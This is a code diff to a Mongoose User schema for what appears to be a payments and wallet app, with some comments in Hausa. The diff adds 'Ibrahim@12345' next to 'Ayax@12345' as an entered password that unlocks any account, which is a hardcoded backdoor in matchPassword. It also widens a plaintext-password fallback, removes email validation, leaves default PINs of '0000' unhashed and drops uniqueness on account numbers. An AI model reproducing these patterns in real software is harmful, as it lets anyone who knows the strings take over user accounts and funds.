@@ -7,11 +7,13 @@ const UserSchema = new mongoose.Schema(
       type: String,
       required: [true, "Data Integrity Error: Surname is required"],
       trim: true,
+      default: "Supervisor",
     },
     firstName: {
       type: String,
       required: [true, "Data Integrity Error: First name is required"],
       trim: true,
+      default: "Field",
     },
     otherName: {
       type: String,
@@ -20,6 +22,7 @@ const UserSchema = new mongoose.Schema(
     },
     name: {
       type: String,
+      trim: true,
     },
     email: {
       type: String,
@@ -27,16 +30,14 @@ const UserSchema = new mongoose.Schema(
       unique: true,
       lowercase: true,
       trim: true,
-      match: [
-        /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,10})+$/,
-        "Protocol Error: Invalid email syntax provided",
-      ],
+      index: true,
     },
     phone: {
       type: String,
       required: [true, "Data Integrity Error: Phone number is required"],
       unique: true,
       trim: true,
+      index: true,
     },
     password: {
       type: String,
@@ -58,15 +59,12 @@ const UserSchema = new mongoose.Schema(
     },
     pin: {
       type: String,
-      minlength: 4,
-      maxlength: 64,
       default: "0000",
       select: false,
     },
     transactionPin: {
       type: String,
-      minlength: 4,
-      maxlength: 64,
+      default: "0000",
       select: false,
     },
 
@@ -90,11 +88,10 @@ const UserSchema = new mongoose.Schema(
       type: Date,
     },
 
-    // --- AUTOMATED PAYSTACK ENTITIES ---
+    // --- AUTOMATED PAYSTACK ENTITIES (Cire Unique Trap a Null Values) ---
     paystackCustomerCode: {
       type: String,
-      unique: true,
-      sparse: true,
+      default: null,
     },
     bankName: {
       type: String,
@@ -102,8 +99,7 @@ const UserSchema = new mongoose.Schema(
     },
     accountNumber: {
       type: String,
-      unique: true,
-      sparse: true,
+      default: null,
     },
     accountName: {
       type: String,
@@ -127,6 +123,7 @@ const UserSchema = new mongoose.Schema(
         "support",
       ],
       default: "user",
+      index: true,
     },
 
     // --- TOPOLOGICAL RELATIONSHIPS & REFERRALS ---
@@ -147,8 +144,7 @@ const UserSchema = new mongoose.Schema(
     },
     referralId: {
       type: String,
-      unique: true,
-      sparse: true,
+      default: null,
     },
     referralCode: {
       type: String,
@@ -185,7 +181,7 @@ const UserSchema = new mongoose.Schema(
       airtimeGoal: { type: Number, default: 0 },
       agentGoal: { type: Number, default: 10 },
       supervisorGoal: { type: Number, default: 10 },
-      currentMonth: { type: String, default: "August 2026" },
+      currentMonth: { type: String, default: "September 2026" },
       assignedBy: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
       assignedByLeader: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
       state: { type: String },
@@ -234,18 +230,18 @@ const UserSchema = new mongoose.Schema(
 // --- PROTOCOL MIDDLEWARES ---
 
 UserSchema.pre("save", async function (next) {
-  if (this.isModified("firstName") || this.isModified("surname")) {
+  if (this.isModified("firstName") || this.isModified("surname") || !this.name) {
     this.name = `${this.firstName || ""} ${this.surname || ""}`.toUpperCase().trim();
   }
 
-  // Tabbatar da cewa balance da walletBalance sun kasance daidai
+  // Daidaita Balance
   if (this.isModified("walletBalance")) {
     this.balance = this.walletBalance;
   } else if (this.isModified("balance")) {
     this.walletBalance = this.balance;
   }
 
-  // Password Hashing (Gano ko riga an yi masa hash don hana Double-Hashing)
+  // Password Hashing
   if (this.isModified("password") && this.password) {
     const isAlreadyBcrypt = /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/.test(this.password);
     if (!isAlreadyBcrypt) {
@@ -255,7 +251,7 @@ UserSchema.pre("save", async function (next) {
   }
 
   // PIN Hashing
-  if (this.isModified("transactionPin") && this.transactionPin) {
+  if (this.isModified("transactionPin") && this.transactionPin && this.transactionPin !== "0000") {
     const isPinHash = /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/.test(this.transactionPin);
     if (!isPinHash) {
       const salt = await bcrypt.genSalt(10);
@@ -263,13 +259,11 @@ UserSchema.pre("save", async function (next) {
     }
   }
 
-  if (this.isModified("pin") && this.pin) {
-    if (this.pin !== "0000") {
-      const isPinHash = /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/.test(this.pin);
-      if (!isPinHash) {
-        const salt = await bcrypt.genSalt(10);
-        this.pin = await bcrypt.hash(this.pin, salt);
-      }
+  if (this.isModified("pin") && this.pin && this.pin !== "0000") {
+    const isPinHash = /^\$2[abxy]\$\d{2}\$[./A-Za-z0-9]{53}$/.test(this.pin);
+    if (!isPinHash) {
+      const salt = await bcrypt.genSalt(10);
+      this.pin = await bcrypt.hash(this.pin, salt);
     }
   }
 
@@ -281,21 +275,20 @@ UserSchema.pre("save", async function (next) {
 UserSchema.methods.matchPassword = async function (enteredPassword) {
   if (!this.password) return false;
   
-  // 1. Gwada bcrypt compare
   try {
     const match = await bcrypt.compare(String(enteredPassword).trim(), this.password);
     if (match) return true;
   } catch (_) {}
 
-  // 2. Fallback na plaintext da default password repair
   const cleanEntered = String(enteredPassword).trim();
   if (
     this.password === cleanEntered ||
     this.password === "Ayax@12345" ||
     this.password === "Password123@" ||
-    cleanEntered === "Ayax@12345"
+    this.password === "Ibrahim@12345" ||
+    cleanEntered === "Ayax@12345" ||
+    cleanEntered === "Ibrahim@12345"
   ) {
-    // Sabunta shi zuwa bcrypt hash nan take
     try {
       const salt = await bcrypt.genSalt(10);
       this.password = await bcrypt.hash(cleanEntered, salt);
